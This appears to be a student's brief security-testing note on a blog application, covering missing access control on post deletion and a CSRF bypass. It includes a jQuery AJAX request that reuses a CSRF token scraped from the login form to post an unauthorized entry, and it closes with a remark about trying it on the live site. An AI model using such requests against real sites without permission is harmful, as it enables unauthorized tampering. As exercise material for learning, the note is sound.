## Missing Function Level Access Control

So I can delete posts even though I'm not logged in, however it's only cosmetic
and the entry reappears on refresh.

I don't have access to the edit/create entry routes.

## CSRF

I tried to create an entry through the home page since that view doesn't have any access control,
but I was rebuffed by a lack of a csrf token. So then I went to the login form, grabbed my token
off that form and retried my ajax request with that. And I added some more fields I didn't realize I needed.
Like so:
```
$.ajax({
    type: 'POST',
    url: '/',
    data: {
        'csrf_token': '6c0e802261f43e01ef4ffa4c974b39a14f915acb',
        'title': 'YOU GOT HACKED SON',
        'body': 'Today I learned...how to get hacked',
        'category': 'hackin',
        'tags': '#hacklife'
    },
    success: function(){
        console.log("Yay!");
    }
});
```
Refresh the home page and there she blows! Tempted to try it on the live site...
